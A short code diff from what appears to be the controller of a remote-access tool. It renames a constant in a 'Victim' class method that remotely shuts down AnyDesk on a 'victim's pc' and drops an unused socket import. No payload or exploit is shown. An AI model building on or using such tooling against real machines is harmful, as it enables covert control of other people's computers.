@@ -1,4 +1,3 @@
-import socket
 import os
 from constants import *
 
@@ -70,7 +69,7 @@ class Victim:
 
     def powerOffAnydesk(self):
         print(f"{self.getAddr()}: Powering off anydesk on the victim's pc")
-        self._sendCommand(POWER_OFF_ANYDESK_CODE)
+        self._sendCommand(POWER_OFF_ANYDESK_COMMAND)
         print(
             f"{self.getAddr()}: Anydesk will be powered off Immediately on the victim's pc")
 
